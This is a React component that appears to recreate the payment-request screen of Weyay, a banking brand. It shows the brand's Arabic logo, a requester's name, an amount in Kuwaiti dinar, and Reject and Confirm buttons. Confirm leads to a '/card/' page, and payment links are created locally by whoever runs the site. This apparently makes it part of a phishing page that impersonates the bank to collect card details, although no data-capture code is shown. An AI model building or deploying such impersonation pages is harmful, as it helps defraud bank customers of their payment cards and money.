
import { useParams, useNavigate } from "react-router-dom";
import { useState, useEffect } from "react";

interface PaymentLink {
  id: string;
  customerName: string;
  amount: number;
  description: string;
  expiryDate: string;
  createdAt: string;
}

const PaymentPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [paymentData, setPaymentData] = useState<PaymentLink | null>(null);

  useEffect(() => {
    // Load payment data from localStorage based on the ID
    const savedLinks = JSON.parse(localStorage.getItem('paymentLinks') || '[]');
    const foundLink = savedLinks.find((link: PaymentLink) => link.id === id);
    
    if (foundLink) {
      setPaymentData(foundLink);
    } else {
      // If payment link not found, redirect to error page
      navigate('/error');
    }
  }, [id, navigate]);

  const handleConfirm = () => {
    navigate(`/card/${id}`);
  };

  // Show loading or redirect if no payment data
  if (!paymentData) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-purple-900 via-purple-800 to-indigo-900 text-white flex items-center justify-center">
        <div className="text-center">
          <div className="text-xl">Loading...</div>
        </div>
      </div>
    );
  }

  // Format amount to show integer and decimal parts
  const formatAmount = (amount: number) => {
    const parts = amount.toFixed(3).split('.');
    return { integer: parts[0], decimal: parts[1] };
  };

  const { integer, decimal } = formatAmount(paymentData.amount);

  return (
    <div className="min-h-screen" style={{ background: 'linear-gradient(180deg, #000000 0%, #2d1b69 50%, #1a1b3a 100%)' }}>
      <div className="container mx-auto px-6 py-8 max-w-md">
        {/* Header with Weyay Logo */}
        <div className="text-center mb-16 pt-8">
          <div className="text-2xl font-bold mb-2 text-white" style={{ fontFamily: 'Arial' }}>
            ويــاي <span className="text-emerald-400">≡</span>
          </div>
        </div>

        {/* Customer Avatar and Info */}
        <div className="text-center mb-12">
          <div className="w-32 h-32 bg-gray-600 rounded-full mx-auto mb-6 flex items-center justify-center">
            <span className="text-4xl font-bold text-white">
              {paymentData.customerName.charAt(0).toUpperCase()}
            </span>
          </div>
          <h2 className="text-2xl font-semibold mb-4 text-white">{paymentData.customerName.toUpperCase()}</h2>
          <p className="text-gray-300 text-lg mb-8">طلب منك</p>
          
          {/* Amount Display */}
          <div className="text-center mb-16">
            <div className="flex justify-center items-baseline">
              <span className="text-lg ml-2 text-white">د.ك</span>
              <span className="text-6xl font-bold text-white">{integer}</span>
              <span className="text-2xl text-white">.{decimal}</span>
            </div>
          </div>
        </div>

        {/* Bill Payment Purpose */}
        <div className="mb-6">
          <div className="bg-gray-700/50 rounded-2xl p-6 text-center">
            <div className="text-right mb-3">
              <span className="text-base text-gray-300">الغرض</span>
            </div>
            <div className="text-xl font-medium text-white">
              {paymentData.description || "Bill Payment"}
            </div>
          </div>
        </div>

        {/* Reject Button */}
        <div className="mb-4">
          <button
            onClick={() => navigate('/error')}
            className="w-full border-2 border-white text-white py-4 rounded-2xl text-xl font-medium hover:bg-white hover:text-black transition-colors"
          >
            رفض الطلب
          </button>
        </div>

        {/* Confirm Button */}
        <div>
          <button
            onClick={handleConfirm}
            className="w-full bg-emerald-400 text-black py-4 rounded-2xl text-xl font-bold hover:bg-emerald-500 transition-colors"
          >
            أكـد
          </button>
        </div>
      </div>
    </div>
  );
};

export default PaymentPage;
